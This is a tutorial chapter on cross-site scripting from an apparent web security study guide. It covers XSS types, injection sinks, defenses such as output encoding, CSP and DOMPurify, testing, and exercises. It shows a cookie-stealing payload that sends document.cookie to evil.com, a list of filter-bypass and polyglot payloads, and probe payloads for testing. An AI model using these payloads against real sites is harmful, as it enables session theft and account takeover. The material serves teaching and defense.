# 01 — Cross-Site Scripting (XSS)

> **"XSS is the consequence of treating user-controlled data as code. The fix is always the same: never mix data and code. Escape everything on the way out, validate everything on the way in, and treat the browser's HTML parser as the adversary it becomes when fed untrusted input."**

Cross-Site Scripting (XSS) is the most prevalent client-side security vulnerability. An attacker injects malicious JavaScript into a web page that another user views. The injected script runs in the victim's browser with the same privileges as the legitimate page — it can steal cookies, hijack sessions, log keystrokes, exfiltrate data, or completely rewrite the page. XSS attacks cost organizations billions of dollars annually in breaches and trust damage. This document covers all three XSS types, every injection sink, defense-in-depth strategies, framework protections, and testing techniques.

---

## 📚 Table of Contents

1. [XSS Types](#1-xss-types)
2. [Injection Sinks — Where XSS Enters the DOM](#2-injection-sinks--where-xss-enters-the-dom)
3. [XSS Payloads and Encoding Bypass](#3-xss-payloads-and-encoding-bypass)
4. [Defense 1 — Output Encoding](#4-defense-1--output-encoding)
5. [Defense 2 — Content Security Policy](#5-defense-2--content-security-policy)
6. [Defense 3 — HttpOnly and Secure Cookies](#6-defense-3--httponly-and-secure-cookies)
7. [Defense 4 — Trusted Types](#7-defense-4--trusted-types)
8. [Framework Protections](#8-framework-protections)
9. [DOM XSS in React](#9-dom-xss-in-react)
10. [Safe HTML Rendering (Sanitization)](#10-safe-html-rendering-sanitization)
11. [XSS in Different Contexts](#11-xss-in-different-contexts)
12. [Testing for XSS](#12-testing-for-xss)
13. [Good Practices](#13-good-practices)
14. [Bad Practices](#14-bad-practices)
15. [Common Mistakes](#15-common-mistakes)
16. [Interview-Level Explanation](#16-interview-level-explanation)
17. [Exercises](#17-exercises)

---

## 1. XSS Types

### Stored XSS (Persistent)

```
ATTACK FLOW:
  1. Attacker submits malicious content to server:
     POST /comments
     body: { content: "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>" }

  2. Server stores the content in database (without sanitization)

  3. Every user who views the page receives:
     <div class="comment">
       <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
     </div>

  4. Each victim's browser executes the script:
     → Sends their session cookie to attacker's server
     → Attacker logs in as the victim

IMPACT: Affects ALL users who view the content
PERSISTENCE: Stays until removed from database
SEVERITY: Critical — affects many users automatically
```

### Reflected XSS (Non-Persistent)

```
ATTACK FLOW:
  1. Attacker crafts malicious URL:
     https://victim.com/search?q=<script>...</script>

  2. Attacker sends URL to victim (email, SMS, social media)

  3. Victim clicks link → server reflects the input back in HTML:
     <p>Search results for: <script>...</script></p>

  4. Browser executes the reflected script

IMPACT: Affects victim who clicks the crafted URL
PERSISTENCE: One-time attack, no storage needed
SEVERITY: High — requires social engineering to deliver
```

### DOM-Based XSS

```
ATTACK FLOW:
  1. Server sends a safe response (no XSS in HTML)

  2. Client-side JavaScript reads from an attacker-controlled source
     and writes to a dangerous sink without sanitization:

     // Vulnerable code:
     const name = location.hash.slice(1);        // source: URL hash
     document.getElementById('greeting').innerHTML = 'Hello, ' + name;  // sink

  3. Victim visits:
     https://victim.com/page#<img src=x onerror=alert(1)>

  4. JavaScript extracts the payload from the hash and writes it to innerHTML

KEY DIFFERENCE:
  Stored/Reflected: vulnerability in server-side code
  DOM XSS: vulnerability in client-side code
  Server response is clean; the browser itself creates the vulnerability
```

---

## 2. Injection Sinks — Where XSS Enters the DOM

A "sink" is an API that can execute JavaScript from a string. Never pass untrusted data to these:

```javascript
// HTML SINKS (execute scripts in HTML context):
element.innerHTML = userInput; // ❌ CRITICAL
element.outerHTML = userInput; // ❌ CRITICAL
document.write(userInput); // ❌ CRITICAL
document.writeln(userInput); // ❌ CRITICAL
element.insertAdjacentHTML("beforeend", userInput); // ❌ CRITICAL

// SCRIPT EXECUTION SINKS:
eval(userInput); // ❌ CRITICAL
new Function(userInput)(); // ❌ CRITICAL
setTimeout(userInput, 1000); // ❌ if string (not function)
setInterval(userInput, 1000); // ❌ if string
element.setAttribute("href", "javascript:" + userInput); // ❌ javascript: URL

// DOM PROPERTY SINKS:
element.src = userInput; // ❌ can be javascript: URL
element.href = userInput; // ❌ can be javascript: URL
element.action = userInput; // ❌ form action
element.data = userInput; // ❌ object data attribute
element.style.cssText = userInput; // ❌ CSS injection possible

// SAFE ALTERNATIVES:
element.textContent = userInput; // ✅ renders as text, not HTML
element.setAttribute("data-value", userInput); // ✅ safe for most attributes
element.className = userInput; // ✅ safe (no code execution)
// For URLs: validate scheme first
```

### Source → Sink Propagation

```javascript
// SOURCES (attacker-controlled input):
location.href            // full URL
location.search          // query string (?key=value)
location.hash            // fragment (#value)
location.pathname        // path
document.referrer        // Referer header
document.cookie          // cookies (less dangerous as source)
window.name              // window name (persists across navigations!)
postMessage event.data   // cross-window messages

// HIGH-RISK PATTERN: reading from source, writing to sink
const search = new URLSearchParams(location.search);
const name   = search.get('name');
document.querySelector('.greeting').innerHTML = `Hello ${name}!`; // DOM XSS!

// SAFE PATTERN: read from source, write to safe sink
const name = search.get('name');
document.querySelector('.greeting').textContent = `Hello ${name}!`; // safe
```

---

## 3. XSS Payloads and Encoding Bypass

Understanding how attackers bypass filters helps you build robust defenses:

```html
<!-- Basic payload -->
<script>alert(1)</script>

<!-- Image onerror (bypasses script tag filters) -->
<img src=x onerror=alert(1)>

<!-- SVG onload -->
<svg onload=alert(1)>

<!-- Event handlers on various elements -->
<div onmouseover=alert(1)>Hover me</div>
<input onfocus=alert(1) autofocus>
<body onload=alert(1)>

<!-- Encoding bypasses (if server decodes before checking) -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>  <!-- HTML entities -->
<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>              <!-- Unicode escapes -->
<img src=x onerror=alert&#40;1&#41;>                               <!-- Partial encoding -->

<!-- Polyglot (works in multiple contexts) -->
javascript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

<!-- javascript: URL in href -->
<a href="javascript:alert(1)">Click</a>
<a href="data:text/html,<script>alert(1)</script>">Click</a>

<!-- CSS-based (in style attributes) -->
<div style="background-image:url(javascript:alert(1))">
```

---

## 4. Defense 1 — Output Encoding

Output encoding is the primary XSS defense: encode user data before inserting it into HTML.

### HTML Context Encoding

```javascript
// Escape HTML special characters before inserting into HTML
function escapeHTML(str) {
  const map = {
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#x27;",
    "/": "&#x2F;",
    "`": "&#x60;",
    "=": "&#x3D;",
  };
  return String(str).replace(/[&<>"'`=\/]/g, (char) => map[char]);
}

// Usage:
const userInput = "<script>alert(1)</script>";
const safeOutput = escapeHTML(userInput);
// → &lt;script&gt;alert(1)&lt;/script&gt;
// Browser renders as text, not HTML
```

### Context-Specific Encoding

```javascript
// ❌ One encoding fits all contexts is wrong
// Each context has different special characters

// HTML ELEMENT context: use escapeHTML
element.innerHTML = escapeHTML(userInput); // but: use textContent instead!

// HTML ATTRIBUTE context: escape HTML + additional chars
element.setAttribute("title", escapeHTMLAttribute(userInput));
// In attribute: & < > " ' must be encoded (quote context matters)

// JAVASCRIPT context (inside <script> or event handler):
// NEVER insert user data directly into JavaScript code
// If you must: JSON.stringify() and validate
const safeJSON = JSON.stringify(userInput); // encodes special chars
element.setAttribute("onclick", `doSomething(${safeJSON})`); // risky pattern

// URL context: encode with encodeURIComponent
const url = `/search?q=${encodeURIComponent(userInput)}`;
// encodeURIComponent: encodes &, =, +, ?, #, /, etc.
// But NOT: validates the scheme (javascript:... is not caught by encodeURIComponent)

// CSS context: avoid entirely — very complex encoding rules
// Never put user input into CSS
```

### URL Sanitization

```javascript
// Validate URLs before using as href/src
function isSafeURL(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    // Only allow http: and https: schemes
    return ["http:", "https:"].includes(parsed.protocol);
  } catch {
    return false; // invalid URL
  }
}

// Safe link rendering:
function SafeLink({ href, children }) {
  const safeSrc = isSafeURL(href) ? href : "#";
  return <a href={safeSrc}>{children}</a>;
}

// ❌ These are dangerous without validation:
// <a href={userInput}>...</a>   → could be javascript:alert(1)
// <img src={userInput}>         → could be javascript: URL
// <iframe src={userInput}>      → could execute code
```

---

## 5. Defense 2 — Content Security Policy

CSP blocks inline scripts and restricts script sources, providing a second line of defense:

```http
# Strict CSP: blocks all inline scripts and restricts sources
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM_NONCE}';
  object-src 'none';
  base-uri 'self';

# What this blocks:
# <script>alert(1)</script>                    → blocked (inline, no nonce)
# <img onerror=alert(1)>                       → blocked (event handler)
# <a href="javascript:alert(1)">               → blocked (javascript: URL)
# <script src="https://evil.com/xss.js">       → blocked (not in script-src)

# What this allows:
# <script nonce="RANDOM_NONCE" src="/app.js">  → allowed (correct nonce)
# <script nonce="RANDOM_NONCE">safe code</script> → allowed (correct nonce)
```

```javascript
// Node.js: generate fresh nonce per request
import { randomBytes } from "crypto";

function generateNonce() {
  return randomBytes(16).toString("base64");
}

app.use((req, res, next) => {
  const nonce = generateNonce();
  res.locals.nonce = nonce;

  res.setHeader(
    "Content-Security-Policy",
    `default-src 'self'; ` +
      `script-src 'self' 'nonce-${nonce}'; ` +
      `style-src 'self' 'nonce-${nonce}'; ` +
      `img-src 'self' data: https:; ` +
      `connect-src 'self' https://api.example.com; ` +
      `object-src 'none'; ` +
      `base-uri 'self'; ` +
      `form-action 'self'; ` +
      `frame-ancestors 'none';`,
  );

  next();
});
```

---

## 6. Defense 3 — HttpOnly and Secure Cookies

Prevent XSS from stealing session cookies:

```http
# Server sets session cookie:
Set-Cookie: session=abc123;
  HttpOnly;     ← JavaScript cannot read document.cookie for this cookie
  Secure;       ← Only sent over HTTPS
  SameSite=Strict; ← Only sent to same-site requests (CSRF protection too)
  Path=/;
  Max-Age=3600
```

```javascript
// HttpOnly effect:
// document.cookie → session cookie NOT included
// fetch() with credentials: 'include' → session cookie IS sent (browser handles it)
// XSS can't steal session token, but can still:
//   - Make authenticated requests (CSRF-like)
//   - Read non-HttpOnly cookies
//   - Read localStorage, sessionStorage
//   - Modify DOM, exfiltrate form data

// Defense in depth:
// HttpOnly + CSP + output encoding together
```

---

## 7. Defense 4 — Trusted Types

Trusted Types is a browser API that forces all DOM XSS sinks to receive typed objects rather than strings:

```javascript
// Enable in CSP:
// Content-Security-Policy: require-trusted-types-for 'script'; trusted-types default

// Without Trusted Types: any string can be assigned to innerHTML
element.innerHTML = userInput; // allowed

// With Trusted Types: must use a TrustedHTML object
element.innerHTML = userInput; // ❌ TypeError: This document requires 'TrustedHTML' assignment

// Create a policy that controls what HTML is allowed
const policy = trustedTypes.createPolicy("default", {
  createHTML: (input) => {
    // Sanitize before converting to TrustedHTML
    return DOMPurify.sanitize(input);
  },
  createScript: (input) => {
    // Only allow specific scripts
    if (!isAllowedScript(input)) throw new Error("Script not allowed");
    return input;
  },
  createScriptURL: (input) => {
    if (!isSafeURL(input)) throw new Error("URL not allowed");
    return input;
  },
});

// Use the policy:
element.innerHTML = policy.createHTML(userInput); // goes through DOMPurify first
```

---

## 8. Framework Protections

Modern frameworks escape HTML automatically. Understanding when they don't is critical.

### React

```jsx
// ✅ React auto-escapes in JSX (safe by default)
function UserName({ name }) {
  return <div>{name}</div>;
  // name is escaped: <script> → &lt;script&gt;
  // Renders as text: the literal text "<script>..."
}

// ❌ dangerouslySetInnerHTML: bypasses all React escaping
function Comment({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
  // If html contains <script>: it executes!
  // The word "dangerously" is not a joke
}

// ✅ Only use with DOMPurify sanitization:
import DOMPurify from "dompurify";
function SafeComment({ html }) {
  const clean = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// ❌ React XSS via href (javascript: URL)
function Link({ url }) {
  return <a href={url}>Click</a>;
  // React does NOT validate URL schemes
  // url = 'javascript:alert(1)' → executes!
}

// ✅ Validate URL scheme:
function SafeLink({ url, children }) {
  const safe = /^https?:\/\//i.test(url) ? url : "#";
  return <a href={safe}>{children}</a>;
}
```

### Vue

```html
<!-- ✅ Vue auto-escapes in templates (safe by default) -->
<template>
  <div>{{ userInput }}</div>  <!-- escaped -->
  <div :title="userInput">   <!-- escaped as attribute -->
</template>

<!-- ❌ v-html: bypasses escaping -->
<template>
  <div v-html="userInput"></div>  <!-- raw HTML — dangerous! -->
</template>

<!-- ✅ Only with sanitization: -->
<script setup>
import DOMPurify from 'dompurify';
const sanitized = computed(() => DOMPurify.sanitize(props.html));
</script>
<template>
  <div v-html="sanitized"></div>
</template>
```

---

## 9. DOM XSS in React

Even though React escapes JSX, DOM XSS can still occur:

```jsx
// ❌ DOM XSS: reading from URL, writing to dangerous location
function SearchPage() {
  useEffect(() => {
    // Source: URL hash
    const query = window.location.hash.slice(1);

    // Sink: innerHTML (bypasses React's protection)
    document.getElementById("result").innerHTML = `Results for: ${query}`;
    // Attack: /search#<img onerror=alert(1)>
  }, []);
}

// ✅ Fix: use safe DOM methods
function SearchPage() {
  const [query, setQuery] = useState("");

  useEffect(() => {
    const raw = window.location.hash.slice(1);
    setQuery(raw); // React state — renders via JSX (escaped)
  }, []);

  return <p>Results for: {query}</p>; // ✅ auto-escaped
}
```

### Dangerous Patterns in React Apps

```jsx
// ❌ Pattern 1: eval() with user data
const value = eval(userInput); // never do this

// ❌ Pattern 2: Constructing component from user string
const Component = components[userInput]; // XSS if userInput = any dangerous value

// ❌ Pattern 3: Injecting into template literals for HTML
const html = `<div class="${userInput}">content</div>`;
element.innerHTML = html; // attribute injection: " onmouseover=alert(1)

// ❌ Pattern 4: ref manipulation
const ref = useRef();
useEffect(() => {
  ref.current.innerHTML = userContent; // bypasses React
}, []);

// ❌ Pattern 5: Unsafe URL in href prop
<a href={props.redirectUrl}>Back</a>;
// Attack: redirectUrl = 'javascript:stealData()'
```

---

## 10. Safe HTML Rendering (Sanitization)

When you must render user-supplied HTML (rich text editor output, CMS content), sanitize it:

```javascript
// DOMPurify: the gold standard for client-side HTML sanitization
import DOMPurify from "dompurify";

// Basic sanitization (removes all scripts, event handlers, javascript: URLs)
const clean = DOMPurify.sanitize(dirtyHTML);

// Strict: allow only specific tags
const clean = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: [
    "b",
    "i",
    "u",
    "em",
    "strong",
    "p",
    "br",
    "ul",
    "ol",
    "li",
    "a",
  ],
  ALLOWED_ATTR: ["href", "title", "target"],
});

// Allow safe HTML but force links to open in new tab with noopener
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName === "A") {
    node.setAttribute("target", "_blank");
    node.setAttribute("rel", "noopener noreferrer");
  }
});
const clean = DOMPurify.sanitize(dirtyHTML);

// React component:
function RichText({ html }) {
  const sanitized = useMemo(
    () =>
      DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ["p", "b", "i", "a", "ul", "li"],
      }),
    [html],
  );
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

### Server-Side Sanitization

```javascript
// Backend: sanitize before storing (defense in depth)
const sanitizeHtml = require("sanitize-html");

function sanitizeUserContent(html) {
  return sanitizeHtml(html, {
    allowedTags: ["b", "i", "em", "strong", "p", "a", "ul", "ol", "li"],
    allowedAttributes: {
      a: ["href", "title"],
    },
    // Validate URL schemes
    allowedSchemes: ["http", "https", "mailto"],
    // Transform relative URLs to absolute
    transformTags: {
      a: sanitizeHtml.simpleTransform("a", { rel: "noopener noreferrer" }),
    },
  });
}
```

---

## 11. XSS in Different Contexts

### JSON in Script Tags

```html
<!-- ❌ Vulnerable: user data in inline JSON -->
<script>
  const userData = {"name": "<!--</script><script>alert(1)</script>"};
</script>
<!-- The value contains </script> which closes the script tag!
     The HTML parser sees the </script> first, before JSON is fully parsed -->

<!-- ✅ Fix: JSON-encode AND HTML-encode -->
<!-- Server-side: escape < > & in JSON strings before injecting -->
<script>
  const userData = {"name": "\\u003c\\u2F script\\u003e..."};
</script>

<!-- ✅ Even better: use a separate API call, not inline data -->
<script src="/api/initial-data.js"></script>
<!-- No inline user data in HTML -->
```

### XSS in URL Parameters

```javascript
// ❌ Reflecting URL parameters into HTML without encoding
app.get("/search", (req, res) => {
  res.send(`<p>Results for: ${req.query.q}</p>`);
  // Attack: /search?q=<script>alert(1)</script>
});

// ✅ Encode before reflecting
app.get("/search", (req, res) => {
  const query = escapeHTML(req.query.q ?? "");
  res.send(`<p>Results for: ${query}</p>`);
});

// ✅ Even better: templating engine with auto-escaping
app.get("/search", (req, res) => {
  res.render("search", { query: req.query.q }); // Handlebars/EJS escapes by default
});
```

### Mutation XSS (mXSS)

```javascript
// Some sanitizers are vulnerable to mutation XSS
// Where sanitized HTML is mutated by the parser to become dangerous

// Example: some versions of DOMPurify had mXSS vulnerabilities
// where specific sequences would pass sanitization but mutate to scripts

// Defense: always use the latest version of your sanitizer
// DOMPurify actively patches mXSS vulnerabilities
npm update dompurify
```

---

## 12. Testing for XSS

### Manual Testing

```javascript
// Test these payloads in every user-input field:

// Basic detection (does alert fire?):
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
';alert(String.fromCharCode(88,83,83))//

// More sophisticated: if alert is blocked, use console.log
<img src=x onerror=console.log('xss-found')>

// DOM-based: test URL parameters, hash, query string
https://target.com/page?search=<img src=x onerror=alert(1)>
https://target.com/page#<svg onload=alert(1)>

// Attribute context: test for attribute injection
"><input autofocus onfocus=alert(1) fake="
';alert(1)//
```

### Automated Testing

```javascript
// OWASP ZAP: automated scanner with XSS rules
// Burp Suite: intercepting proxy with active scanner
// DOMinator: Chrome extension for finding DOM XSS sinks

// Custom scan: check for common sinks in your codebase
const DANGEROUS_SINKS = [
  /\.innerHTML\s*=/,
  /\.outerHTML\s*=/,
  /document\.write\(/,
  /\beval\(/,
  /new Function\(/,
  /\bdangerouslySetInnerHTML\b/,
  /\.insertAdjacentHTML\(/,
];

// Find all uses in your codebase:
// grep -rn "innerHTML" src/
// grep -rn "dangerouslySetInnerHTML" src/

// ESLint rule for dangerous sinks:
// npm install eslint-plugin-no-unsanitized
{
  "plugins": ["no-unsanitized"],
  "rules": {
    "no-unsanitized/property": "error",  // flags innerHTML, outerHTML
    "no-unsanitized/method": "error"     // flags insertAdjacentHTML
  }
}
```

---

## 13. Good Practices

### ✅ Prefer textContent over innerHTML

```javascript
// ✅ textContent: always safe, no HTML parsing
element.textContent = userInput;
// Renders: literal text including < > & etc.

// innerHTML only when you intentionally want HTML
// AND only with sanitized content
```

### ✅ Validate URL schemes

```javascript
// ✅ Validate before using as href or src
function sanitizeURL(url) {
  try {
    const parsed = new URL(url, window.location.href);
    if (!["http:", "https:", "mailto:"].includes(parsed.protocol)) {
      return "#"; // block javascript:, data:, vbscript:
    }
    return parsed.toString();
  } catch {
    return "#";
  }
}
```

### ✅ Use framework escaping — never bypass it

```jsx
// ✅ JSX auto-escaping: the safest default
<div>{userContent}</div>

// ❌ Bypassing escaping: only with sanitization + good reason
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
```

### ✅ Sanitize on both server and client

```javascript
// Server: sanitize before storing (attacker can't poison the DB)
// Client: sanitize before rendering (defense in depth, handles client-side sources)
// Don't rely on only one layer
```

---

## 14. Bad Practices

### ❌ Sanitizing on input, trusting on output

```javascript
// ❌ Common mistake: sanitize when user submits, trust the stored data
app.post("/comment", (req, res) => {
  const clean = sanitize(req.body.content); // sanitize on input
  db.comments.insert({ content: clean }); // store "trusted" content
});

// Later:
app.get("/post/:id", (req, res) => {
  const post = db.posts.get(req.params.id);
  res.send(`<div>${post.content}</div>`); // render without encoding!
  // Problem: if sanitize() had a bug or your sanitizer is updated,
  // stored "clean" data may still be exploitable
});

// ✅ Sanitize on OUTPUT (rendering), not just input
// Input validation: good for catching errors
// Output encoding: prevents execution even if storage was compromised
```

### ❌ Client-side-only sanitization

```javascript
// ❌ Sanitizing only in the browser
// Attacker can bypass the browser entirely (curl, Postman, modified JS)
// and send unsanitized content directly to the server

// ✅ Server-side sanitization is required for stored/reflected XSS
// Client-side sanitization: defense in depth only
```

---

## 15. Common Mistakes

### Mistake 1 — Trusting sanitized HTML from the database as safe for innerHTML

```javascript
// Database stores "sanitized" comment content
// But sanitization rules change, DOMPurify updates, mXSS vulnerabilities found

// ❌ Trusting stored HTML as permanently safe
element.innerHTML = storedComment; // no additional sanitization

// ✅ Re-sanitize on every render (cheap, defense in depth)
element.innerHTML = DOMPurify.sanitize(storedComment);
// DOMPurify: 50-100μs per call — negligible cost
```

### Mistake 2 — Forgetting React doesn't sanitize href and src

```jsx
// ❌ React doesn't prevent javascript: URLs in href/src
<a href={props.url}>Link</a>  // props.url = 'javascript:alert(1)' → XSS!
<img src={props.image}>       // props.image = 'javascript:...' → XSS!
<iframe src={props.embed}>    // similarly risky

// ✅ Always validate URL scheme
<a href={sanitizeURL(props.url)}>Link</a>
```

### Mistake 3 — XSS in React via DOM refs

```jsx
// ❌ Direct DOM manipulation via refs bypasses React escaping
const divRef = useRef();
useEffect(() => {
  divRef.current.innerHTML = props.html; // direct DOM = no React escaping
}, [props.html]);

// ✅ Use state + JSX rendering (React escapes):
const [content, setContent] = useState("");
useEffect(() => {
  setContent(props.plainText);
}, [props.plainText]);
return <div>{content}</div>; // escaped via JSX

// ✅ For HTML: sanitize before direct DOM manipulation
divRef.current.innerHTML = DOMPurify.sanitize(props.html);
```

---

## 16. Interview-Level Explanation

> **"What is XSS? How do you prevent it?"**

**Strong answer:**

> "XSS — Cross-Site Scripting — is a class of vulnerabilities where attacker-controlled data is rendered as executable JavaScript in a victim's browser. There are three types: stored XSS where malicious content is saved to the database and served to every user; reflected XSS where the attack payload is in a URL that the victim clicks; and DOM-based XSS where client-side JavaScript reads from an attacker-controlled source (like the URL hash) and writes to a dangerous sink (like innerHTML) without sanitization.
>
> The root cause is always mixing data and code — treating a string as HTML or JavaScript without proper encoding. The defense is output encoding: escaping HTML special characters (`<`, `>`, `&`, `"`, `'`) when inserting data into HTML, so the browser treats it as text rather than markup. The key insight is that you encode at the point of output, in the specific context where the data will appear, because different contexts require different encoding — HTML context, JavaScript context, URL context, and CSS context all have different dangerous characters.
>
> In React, JSX auto-escapes by default, which protects against most XSS. The primary way to introduce XSS in React is `dangerouslySetInnerHTML` (the name is literally a warning) and JavaScript URL schemes in `href` or `src` props — React doesn't validate URL schemes. If you need to render user-supplied HTML, use DOMPurify to sanitize it before passing to `dangerouslySetInnerHTML`.
>
> Beyond output encoding, defense in depth adds more layers. Content Security Policy blocks inline scripts and restricts script sources — even if an attacker injects HTML, CSP prevents their JavaScript from executing. HttpOnly cookies prevent XSS from stealing session tokens via document.cookie, though it doesn't prevent authenticated requests. Trusted Types is a modern browser API that makes dangerous sinks require explicitly-typed objects rather than plain strings, pushing sanitization into one auditable location.
>
> Testing for XSS: use `<img src=x onerror=console.log('xss')>` as a probe payload in every input field, URL parameter, and URL fragment. Audit your codebase with grep for innerHTML, dangerouslySetInnerHTML, eval, and document.write. Use ESLint rules like no-unsanitized to catch dangerous patterns automatically."

---

## 17. Exercises

### Exercise 1 — Identify XSS vulnerabilities

```jsx
// Find all XSS vulnerabilities in this React component:
function UserProfile({ userId }) {
  const [user, setUser] = useState(null);

  useEffect(() => {
    const id = new URLSearchParams(location.search).get("debug") || userId;
    fetch(`/api/users/${id}`)
      .then((r) => r.json())
      .then(setUser);

    // Initialize analytics with user agent
    const ua = navigator.userAgent;
    document.querySelector("#analytics").innerHTML = `UA: ${ua}`;
  }, [userId]);

  if (!user) return null;

  return (
    <div>
      <h1>{user.name}</h1>
      <div dangerouslySetInnerHTML={{ __html: user.bio }} />
      <a href={user.website}>Visit Website</a>
      <div
        ref={(el) => {
          if (el) el.innerHTML = `Member since: ${user.joinDate}`;
        }}
      />
    </div>
  );
}
```

<details>
<summary>Answer</summary>

```
Vulnerabilities found:

1. DOM XSS via URL parameter:
   const id = new URLSearchParams(location.search).get('debug') || userId;
   fetch(`/api/users/${id}`)
   → Attacker can pass any value as 'debug' to fetch arbitrary user data
   → URL injection: /profile?debug=../../admin → path traversal possible
   Fix: Validate 'id' is a safe user ID format before using in fetch URL

2. DOM XSS via innerHTML with navigator.userAgent:
   document.querySelector('#analytics').innerHTML = `UA: ${ua}`;
   → navigator.userAgent is a source! Browser-controlled, but can be manipulated
   → Classic DOM XSS pattern: source → innerHTML sink
   Fix: document.querySelector('#analytics').textContent = `UA: ${ua}`;

3. Stored XSS via dangerouslySetInnerHTML without sanitization:
   <div dangerouslySetInnerHTML={{ __html: user.bio }} />
   → If user.bio contains <script> or event handlers: XSS
   Fix: DOMPurify.sanitize(user.bio) before rendering

4. href XSS via javascript: URL:
   <a href={user.website}>Visit Website</a>
   → user.website = 'javascript:stealCookies()' → XSS on click
   Fix: validate URL scheme before rendering

5. DOM XSS via ref + innerHTML with user data:
   if (el) el.innerHTML = `Member since: ${user.joinDate}`;
   → Direct DOM manipulation bypasses React escaping
   → If joinDate contains HTML: XSS
   Fix: use textContent or render via JSX state

Fixed component:
function UserProfile({ userId }) {
  const [user, setUser] = useState(null);

  useEffect(() => {
    // Don't use URL params to override userId
    fetch(`/api/users/${userId}`).then(r => r.json()).then(setUser);

    // Safe DOM manipulation
    const ua = navigator.userAgent;
    const el = document.querySelector('#analytics');
    if (el) el.textContent = `UA: ${ua}`; // textContent, not innerHTML
  }, [userId]);

  if (!user) return null;

  // Validate URL
  const safeSite = /^https?:\/\//i.test(user.website) ? user.website : '#';

  return (
    <div>
      <h1>{user.name}</h1>
      <div dangerouslySetInnerHTML={{
        __html: DOMPurify.sanitize(user.bio) // sanitized!
      }} />
      <a href={safeSite}>Visit Website</a>
      <div>Member since: {user.joinDate}</div> {/* JSX: auto-escaped */}
    </div>
  );
}
```

</details>

---

## 🔗 Related Topics

- [`security/02-csrf.md`](./02-csrf.md) — CSRF (often confused with XSS)
- [`networking/04-cors-and-security.md`](../networking/04-cors-and-security.md) — CSP, SRI from networking perspective
- [`security/03-headers.md`](./03-headers.md) — All security headers including CSP
- [`testing/02-integration-testing.md`](../testing/02-integration-testing.md) — Testing for security vulnerabilities

---

<div align="center">

**Next:** [`security/02-csrf.md`](./02-csrf.md) →

</div>
